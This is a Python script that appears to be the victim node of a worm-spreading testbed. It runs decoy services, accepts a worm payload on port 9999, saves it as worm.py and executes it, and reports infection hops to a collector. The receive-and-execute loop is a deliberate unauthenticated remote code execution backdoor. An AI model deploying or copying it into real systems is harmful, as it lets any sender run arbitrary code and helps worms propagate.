import socket
import threading
import os
import json
from datetime import datetime

COLLECTOR_IP = "192.168.210.10"
COLLECTOR_PORT = 8888

def get_my_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.100.10", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def send_log(data):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((COLLECTOR_IP, COLLECTOR_PORT))
        s.sendall(json.dumps(data).encode())
        s.close()
        print("[WORM] Log sent to collector")
    except:
        print("[WORM] Failed to send log to collector")

def open_port(port):
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(5)
    print(f"[SERVICE] Port {port} listening")
    while True:
        conn, addr = s.accept()
        print(f"[SERVICE] Connection received on port {port} from {addr[0]}")
        conn.close()

def receive_worm():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", 9999))
    s.listen(5)
    print("[WORM] Worm listener active on port 9999")
    while True:
        conn, addr = s.accept()
        source_ip = addr[0]
        print(f"[WORM] Incoming worm from {source_ip}")
        data = b""
        while True:
            chunk = conn.recv(4096)
            if not chunk:
                break
            data += chunk
        conn.close()

        print(f"[WORM] Payload received ({len(data)} bytes)")

        # parse state from first line
        decoded = data.decode()
        lines = decoded.splitlines()
        hop_count = 0
        infected = []
        if lines[0].startswith("# STATE:"):
            try:
                state = json.loads(lines[0][8:])
                hop_count = state.get("hop_count", 0)
                infected = state.get("infected", [])
            except:
                pass

        # increment hop here — this is ground truth
        hop_count += 1
        my_ip = get_my_ip()
        infected.append(my_ip)

        print(f"[WORM] Saving worm as worm.py")
        with open("worm.py", "wb") as f:
            f.write(data)

        # log to collector from victim side
        send_log({
            "worm_type": "W1_stealth",
            "source_ip": source_ip,
            "infected_ip": my_ip,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "hop_count": hop_count,
            "infected_chain": infected
        })

        print(f"[WORM] Executing worm.py (hop {hop_count})")
        os.system("python3 worm.py &")

print("[SYSTEM] Starting fake services...")
for port in [21, 22, 80, 443, 3306]:
    threading.Thread(target=open_port, args=(port,), daemon=True).start()
print("[SYSTEM] Waiting for worm payload...")
receive_worm()
